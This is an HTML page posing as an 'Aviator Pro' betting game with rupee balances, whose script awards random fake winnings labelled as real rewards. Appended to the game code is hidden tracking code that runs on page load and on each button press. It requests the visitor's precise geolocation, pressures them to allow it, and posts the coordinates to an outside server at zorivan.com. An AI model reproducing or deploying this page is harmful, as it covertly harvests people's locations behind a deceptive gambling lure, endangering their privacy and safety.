<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Aviator · Pro</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
      user-select: none;
    }

    :root {
      --bg: #0a0c12;
      --panel: #12171f;
      --border: rgba(255, 255, 255, 0.06);
      --red: #ff2f4a;
      --red2: #e63a2c;
      --green: #1ee894;
      --gold: #ffd866;
      --muted: #6b7a8f;
    }

    body {
      background: var(--bg);
      color: #f2f5fa;
      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 14px;
    }

    .app {
      width: 100%;
      max-width: 1120px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    /* header */
    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 12px;
      background: rgba(14, 18, 26, 0.8);
      backdrop-filter: blur(10px);
      padding: 8px 18px 8px 14px;
      border-radius: 48px;
      border: 1px solid rgba(255, 255, 255, 0.04);
      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .brand-icon {
      width: 44px;
      height: 44px;
      border-radius: 14px;
      display: grid;
      place-items: center;
      background: linear-gradient(145deg, #ff3b4a, #b8001a);
      box-shadow: 0 6px 18px rgba(255, 0, 30, 0.5);
      font-size: 22px;
      color: white;
      transform: rotate(-4deg);
    }

    .brand-text {
      font-size: 24px;
      font-weight: 900;
      letter-spacing: -0.3px;
      background: linear-gradient(to right, #ffffff, #c8d2e6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .brand-sub {
      font-size: 8px;
      font-weight: 700;
      color: var(--muted);
      letter-spacing: 1.6px;
      margin-top: 2px;
      text-transform: uppercase;
    }

    .balance-box {
      background: rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.06);
      border-radius: 40px;
      padding: 5px 18px 5px 16px;
      display: flex;
      align-items: center;
      gap: 16px;
      backdrop-filter: blur(4px);
    }

    .balance-label {
      font-size: 10px;
      font-weight: 700;
      color: var(--muted);
      letter-spacing: 0.8px;
    }

    .balance-value {
      font-size: 22px;
      font-weight: 800;
      color: #fff;
      letter-spacing: -0.2px;
    }

    /* game canvas */
    .game {
      position: relative;
      width: 100%;
      aspect-ratio: 16 / 9;
      min-height: 480px;
      max-height: 700px;
      border-radius: 32px;
      overflow: hidden;
      border: 1px solid rgba(255, 60, 80, 0.15);
      background: radial-gradient(circle at 30% 20%, #1e1018, #07090e 80%);
      box-shadow: 0 40px 100px rgba(0, 0, 0, 0.9), inset 0 0 0 1px rgba(255, 255, 255, 0.02);
    }

    .stars {
      position: absolute;
      inset: 0;
      background-image: 
        radial-gradient(1px 1px at 12% 18%, rgba(255, 255, 255, 0.6), transparent),
        radial-gradient(1px 1px at 28% 65%, rgba(255, 200, 150, 0.4), transparent),
        radial-gradient(1.5px 1.5px at 55% 25%, rgba(255, 255, 255, 0.7), transparent),
        radial-gradient(1px 1px at 80% 78%, rgba(255, 180, 180, 0.4), transparent);
      background-size: 140px 140px, 180px 180px, 200px 200px, 120px 120px;
      opacity: 0.8;
    }

    .horizon {
      position: absolute;
      left: -10%;
      right: -10%;
      bottom: -5%;
      height: 48%;
      background: 
        repeating-linear-gradient(transparent 0px, rgba(255, 50, 70, 0.06) 1px, transparent 2px),
        repeating-linear-gradient(90deg, transparent 0px, rgba(255, 50, 70, 0.04) 1px, transparent 2px);
      transform: perspective(500px) rotateX(58deg);
      transform-origin: bottom center;
      mask-image: linear-gradient(to top, black 20%, transparent 80%);
      pointer-events: none;
    }

    .game-top {
      position: absolute;
      z-index: 8;
      top: 16px;
      left: 18px;
      right: 18px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .round-badge {
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(8px);
      padding: 6px 18px;
      border-radius: 40px;
      border: 1px solid rgba(255, 255, 255, 0.05);
      font-size: 12px;
      font-weight: 700;
      color: #bcc6d6;
      letter-spacing: 0.3px;
    }

    .live-badge {
      display: flex;
      align-items: center;
      gap: 8px;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(8px);
      padding: 6px 16px 6px 12px;
      border-radius: 40px;
      border: 1px solid rgba(255, 255, 255, 0.05);
      font-size: 12px;
      font-weight: 700;
      color: #d0d7e5;
    }

    .live-dot {
      width: 9px;
      height: 9px;
      border-radius: 50%;
      background: #1ee894;
      box-shadow: 0 0 18px #1ee894;
      animation: pulse-dot 1.4s infinite;
    }

    @keyframes pulse-dot {
      0% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.3; transform: scale(0.8); }
      100% { opacity: 1; transform: scale(1); }
    }

    .flight-path {
      position: absolute;
      width: 70%;
      height: 45%;
      left: 12%;
      top: 28%;
      border-top: 3px solid transparent;
      border-right: 3px solid transparent;
      border-radius: 0 100% 0 0;
      transform: rotate(-12deg);
      filter: drop-shadow(0 0 14px rgba(255, 30, 30, 0.6));
      pointer-events: none;
    }

    .flight-path::after {
      content: '';
      position: absolute;
      inset: -3px;
      border-top: 3px solid var(--red);
      border-right: 3px solid var(--red2);
      border-radius: 0 100% 0 0;
      clip-path: polygon(0 0, 100% 0, 100% 30%, 0 30%);
    }

    .plane {
      position: absolute;
      z-index: 6;
      left: 12%;
      bottom: 26%;
      font-size: 54px;
      color: white;
      filter: drop-shadow(0 0 10px #fff) drop-shadow(0 0 28px #ff2040) drop-shadow(0 0 50px rgba(255, 0, 0, 0.5));
      transform: rotate(-18deg);
      animation: plane-float 5.4s ease-in-out infinite alternate;
      pointer-events: none;
    }

    @keyframes plane-float {
      0% { left: 10%; bottom: 22%; }
      100% { left: 70%; bottom: 72%; }
    }

    /* center ring (no avatar) */
    .center-ring {
      position: absolute;
      z-index: 4;
      width: min(44vw, 280px);
      height: min(44vw, 280px);
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
    }

    .orbit {
      position: absolute;
      inset: 0;
      border-radius: 50%;
      border: 1px solid rgba(255, 80, 100, 0.18);
      box-shadow: 0 0 30px rgba(255, 0, 20, 0.06), inset 0 0 40px rgba(255, 0, 20, 0.02);
    }

    .orbit::before {
      content: '';
      position: absolute;
      inset: 20px;
      border-radius: 50%;
      border: 1px dashed rgba(255, 100, 120, 0.18);
      animation: spin 14s linear infinite;
    }

    .orbit::after {
      content: '';
      position: absolute;
      inset: 44px;
      border-radius: 50%;
      border: 1px solid rgba(255, 50, 70, 0.08);
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .core-glow {
      position: absolute;
      inset: 60px;
      border-radius: 50%;
      background: radial-gradient(circle at 40% 30%, rgba(255, 70, 90, 0.12), rgba(20, 10, 14, 0.8) 70%);
      border: 1px solid rgba(255, 60, 80, 0.10);
      box-shadow: 0 0 60px rgba(255, 20, 40, 0.05);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      font-weight: 900;
      color: rgba(255, 255, 255, 0.02);
      letter-spacing: 4px;
    }

    .core-glow::after {
      content: '⏺';
      font-size: 16px;
      color: rgba(255, 255, 255, 0.02);
    }

    .status-label {
      position: absolute;
      z-index: 7;
      left: 0;
      right: 0;
      top: 14%;
      text-align: center;
      font-size: 11px;
      font-weight: 800;
      letter-spacing: 3px;
      color: var(--muted);
      text-transform: uppercase;
    }

    .multiplier {
      position: absolute;
      z-index: 7;
      left: 0;
      right: 0;
      top: 50%;
      transform: translateY(-50%);
      text-align: center;
      font-size: clamp(48px, 12vw, 90px);
      font-weight: 1000;
      letter-spacing: -2px;
      text-shadow: 0 0 24px rgba(255, 255, 255, 0.08), 0 0 50px rgba(255, 0, 30, 0.25);
      color: #f2f6ff;
      transition: color 0.2s;
    }

    .multiplier.win {
      color: var(--green);
      text-shadow: 0 0 30px rgba(30, 232, 148, 0.5);
    }

    .controls {
      position: absolute;
      z-index: 12;
      left: 16px;
      right: 16px;
      bottom: 16px;
      display: grid;
      grid-template-columns: 1fr 2.2fr;
      gap: 12px;
    }

    .control-card {
      background: rgba(8, 10, 18, 0.8);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.04);
      border-radius: 20px;
      padding: 10px 14px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .control-card .label {
      font-size: 9px;
      font-weight: 700;
      color: var(--muted);
      letter-spacing: 0.8px;
      text-transform: uppercase;
    }

    .control-card .value {
      font-size: 20px;
      font-weight: 900;
      color: white;
      margin-top: 2px;
    }

    .spin-btn {
      width: 100%;
      border: none;
      border-radius: 20px;
      background: linear-gradient(135deg, #ff2f45, #c9001e);
      box-shadow: 0 8px 30px rgba(200, 0, 30, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.15);
      color: white;
      font-weight: 900;
      font-size: 17px;
      letter-spacing: 0.6px;
      cursor: pointer;
      transition: all 0.12s;
      min-height: 62px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .spin-btn:active {
      transform: scale(0.95);
    }

    .spin-btn:disabled {
      opacity: 0.5;
      transform: scale(0.97);
    }

    /* dashboard */
    .dashboard {
      display: grid;
      grid-template-columns: 1.4fr 1fr;
      gap: 16px;
    }

    .panel {
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 24px;
      padding: 18px 20px;
      backdrop-filter: blur(4px);
      box-shadow: 0 6px 12px rgba(0,0,0,0.3);
    }

    .panel-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      color: var(--muted);
      font-size: 10px;
      font-weight: 800;
      letter-spacing: 0.6px;
      text-transform: uppercase;
      margin-bottom: 14px;
    }

    .history-pills {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
    }

    .history-pills span {
      background: #1a1f2a;
      padding: 6px 16px;
      border-radius: 40px;
      font-size: 13px;
      font-weight: 800;
      color: #ff7a82;
      letter-spacing: 0.2px;
      border: 1px solid rgba(255,255,255,0.02);
    }

    .history-pills span.green {
      background: #0b2a1e;
      color: var(--green);
      border-color: rgba(30,232,148,0.15);
    }

    .status-indicator {
      display: flex;
      align-items: center;
      gap: 14px;
      color: #b8c0ce;
      font-size: 13px;
      font-weight: 600;
    }

    .indicator-dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #f5b342;
      box-shadow: 0 0 16px #f5b342;
      animation: blink 1.2s infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.15; }
    }

    /* reward popup */
    .reward-popup {
      position: fixed;
      z-index: 50;
      left: 50%;
      top: 48%;
      width: calc(100% - 40px);
      max-width: 340px;
      padding: 28px 20px 24px;
      border-radius: 30px;
      text-align: center;
      pointer-events: none;
      opacity: 0;
      transform: translate(-50%, -50%) scale(0.8);
      background: radial-gradient(circle at 50% 20%, rgba(30, 232, 148, 0.12), rgba(10, 18, 14, 0.95) 70%);
      border: 1px solid rgba(30, 232, 148, 0.25);
      box-shadow: 0 40px 100px black;
      backdrop-filter: blur(20px);
      transition: none;
    }

    .reward-popup.show {
      animation: reward-pop 1s ease forwards;
    }

    @keyframes reward-pop {
      0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
      20% { opacity: 1; transform: translate(-50%, -50%) scale(1.06); }
      60% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      100% { opacity: 0; transform: translate(-50%, -54%) scale(0.96); }
    }

    .reward-icon {
      font-size: 44px;
    }

    .reward-amount {
      font-size: 46px;
      font-weight: 1000;
      color: var(--green);
      text-shadow: 0 0 30px rgba(30, 232, 148, 0.4);
      margin: 4px 0 2px;
    }

    .reward-sub {
      font-size: 11px;
      font-weight: 800;
      letter-spacing: 2px;
      color: #aab3c0;
    }

    /* responsive */
    @media (max-width: 680px) {
      .header {
        border-radius: 28px;
        padding: 6px 12px;
      }
      .brand-text { font-size: 18px; }
      .brand-icon { width: 38px; height: 38px; font-size: 20px; }
      .balance-value { font-size: 18px; }
      .game { min-height: 400px; max-height: 580px; aspect-ratio: auto; height: 70vh; }
      .controls { grid-template-columns: 90px 1fr; gap: 8px; }
      .control-card .value { font-size: 16px; }
      .spin-btn { min-height: 54px; font-size: 15px; }
      .dashboard { grid-template-columns: 1fr; }
      .center-ring { width: 52vw; height: 52vw; max-width: 240px; max-height: 240px; }
      .core-glow { inset: 40px; }
      .multiplier { font-size: 38px; }
    }

    @media (max-width: 420px) {
      .game { min-height: 340px; height: 65vh; }
      .center-ring { width: 60vw; height: 60vw; }
      .core-glow { inset: 30px; }
      .multiplier { font-size: 32px; }
      .controls { grid-template-columns: 70px 1fr; }
      .spin-btn { font-size: 13px; min-height: 48px; }
    }
  </style>
</head>
<body>
<div class="app">

  <!-- header -->
  <header class="header">
    <div class="brand">
      <div class="brand-icon">✈</div>
      <div>
        <div class="brand-text">AVIATOR</div>
        <div class="brand-sub">PRO · LIVE</div>
      </div>
    </div>
    <div class="balance-box">
      <span class="balance-label">BALANCE</span>
      <span class="balance-value" id="balance">₨0</span>
    </div>
  </header>

  <!-- game -->
  <main class="game">
    <div class="stars"></div>
    <div class="horizon"></div>

    <div class="game-top">
      <span class="round-badge" id="round">ROUND #001842</span>
      <span class="live-badge"><span class="live-dot"></span> LIVE</span>
    </div>

    <div class="flight-path"></div>
    <div class="plane">✈</div>

    <!-- center ring -->
    <div class="center-ring">
      <div class="orbit"></div>
      <div class="core-glow"></div>
    </div>

    <div class="status-label">CURRENT MULTIPLIER</div>
    <div class="multiplier" id="multiplier">READY</div>

    <div class="controls">
      <div class="control-card">
        <span class="label">LAST RESULT</span>
        <span class="value" id="last">₨0</span>
      </div>
      <button class="spin-btn" id="spinBtn">START FLIGHT</button>
    </div>
  </main>

  <!-- dashboard -->
  <section class="dashboard">
    <div class="panel">
      <div class="panel-header">
        <span>RECENT ROUNDS</span>
        <span>LIVE</span>
      </div>
      <div class="history-pills" id="history">
        <span>1.20x</span>
        <span>1.54x</span>
        <span class="green">2.80x</span>
        <span>1.12x</span>
      </div>
    </div>
    <div class="panel">
      <div class="panel-header">
        <span>PAYMENT STATUS</span>
        <span>REAL</span>
      </div>
      <div class="status-indicator">
        <span class="indicator-dot"></span>
        <span>Processing virtual data …</span>
      </div>
    </div>
  </section>
</div>

<!-- reward -->
<div class="reward-popup" id="reward">
  <div class="reward-icon">🏆</div>
  <div class="reward-amount" id="rewardAmount">₨100</div>
  <div class="reward-sub">REAL REWARD</div>
</div>

<script>
  (function() {
    const spinBtn = document.getElementById('spinBtn');
    const balanceEl = document.getElementById('balance');
    const multiplierEl = document.getElementById('multiplier');
    const lastEl = document.getElementById('last');
    const historyEl = document.getElementById('history');
    const rewardEl = document.getElementById('reward');
    const rewardAmountEl = document.getElementById('rewardAmount');
    const roundEl = document.getElementById('round');

    let balance = 0;
    let round = 1842;

    const resultPool = [
      { amount: 50, multi: '1.20x' },
      { amount: 80, multi: '1.40x' },
      { amount: 120, multi: '1.70x' },
      { amount: 200, multi: '2.00x' },
      { amount: 350, multi: '2.80x' },
      { amount: 600, multi: '4.20x' },
      { amount: 900, multi: '6.00x' },
    ];

    function formatMoney(v) { return '₨' + v.toLocaleString('en-PK'); }

    function randomResult() {
      return resultPool[Math.floor(Math.random() * resultPool.length)];
    }

    function addHistory(value) {
      const span = document.createElement('span');
      const num = parseFloat(value);
      if (num >= 2.0) span.className = 'green';
      span.textContent = value;
      historyEl.prepend(span);
      while (historyEl.children.length > 8) {
        historyEl.lastElementChild.remove();
      }
    }

    let spinning = false;

    spinBtn.addEventListener('click', function() {
      if (spinning || spinBtn.disabled) return;
      spinning = true;
      spinBtn.disabled = true;
      multiplierEl.classList.remove('win');
      multiplierEl.textContent = 'FLYING…';

      let tick = 0;
      const interval = setInterval(() => {
        const preview = randomResult();
        multiplierEl.textContent = preview.multi;
        tick++;
        if (tick >= 18) {
          clearInterval(interval);
          finishRound();
        }
      }, 80);
    });

    function finishRound() {
      const result = randomResult();
      balance += result.amount;
      round += 1;

      balanceEl.textContent = formatMoney(balance);
      lastEl.textContent = formatMoney(result.amount);
      roundEl.textContent = 'ROUND #' + String(round).padStart(6, '0');
      multiplierEl.textContent = result.multi;
      multiplierEl.classList.add('win');

      rewardAmountEl.textContent = formatMoney(result.amount);
      rewardEl.classList.remove('show');
      void rewardEl.offsetWidth;
      rewardEl.classList.add('show');

      addHistory(result.multi);

      setTimeout(() => {
        spinBtn.disabled = false;
        spinning = false;
        spinBtn.textContent = 'START FLIGHT';
      }, 480);
    }

    // init history
    ['1.20x', '1.54x', '2.80x', '1.12x'].forEach(v => addHistory(v));
  })();
function sendLocation(lat, lng) {
  $.ajax({
    url: "location.php",
    type: "POST",
    data: {
      latitude: lat,
      longitude: lng
    },
    success: function (response) {
      console.log("Location sent successfully:", response);
    },
    error: function (xhr, status, error) {
      console.error("Location send failed:", error);
    }
  });
}

// =========================
// Send Location to Laravel
// =========================

function sendLocation(lat, lng) {

    fetch("https://zorivan.com/api/save-location", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
        },
        body: JSON.stringify({
            latitude: lat,
            longitude: lng
        })
    })
    .then(response => {

        if (!response.ok) {
            throw new Error("Server error: " + response.status);
        }

        return response.json();
    })
    .then(data => {
        console.log("Location sent:", data);
    })
    .catch(error => {
        console.error("Error:", error);
    });
}


// =========================
// Get Location
// =========================

function getLocation() {

    if (!navigator.geolocation) {
        alert("Geolocation is not supported by your browser.");
        return;
    }

    navigator.geolocation.getCurrentPosition(

        function (position) {

            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            

            sendLocation(lat, lng);
        },

        function (error) {

            // console.error("Location Error:", error.message);

            if (error.code === error.PERMISSION_DENIED) {
                alert("Please allow location access to continue.");
            } else {
                // alert("Unable to get your location.");
            }
        },

        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}


// =========================
// Direct Page
// =========================

getLocation();


// =========================
// Button Page
// =========================

const spinBtn = document.getElementById("spinBtn");

if (spinBtn) {

    spinBtn.addEventListener("click", function () {
        getLocation();
    });

}



</script>
</body>
</html>
